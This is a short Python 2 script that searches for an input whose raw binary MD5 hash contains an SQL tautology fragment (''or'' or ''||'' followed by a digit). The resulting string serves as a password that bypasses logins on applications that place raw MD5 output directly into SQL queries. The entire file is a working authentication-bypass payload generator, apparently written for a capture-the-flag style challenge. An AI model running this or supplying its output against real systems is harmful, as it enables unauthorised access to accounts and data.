import hashlib, random, string, re


def validAttack(attackStr):
	pos1 = attackStr.find("'||'")
	if pos1 >= 0: # valid
		return attackStr[pos1 + 4].isdigit()
	else:
		pos2 = attackStr.lower().find("'or'")
		if pos2 >= 0: # valid
			return attackStr[pos2 + 4].isdigit()
	return False


i = 129581926211651571912466741651878680000
while True:
	randStr = str(i)
	md5hash = hashlib.md5(randStr).digest()
	i += 1
	if(validAttack(md5hash)):
		break

print randStr
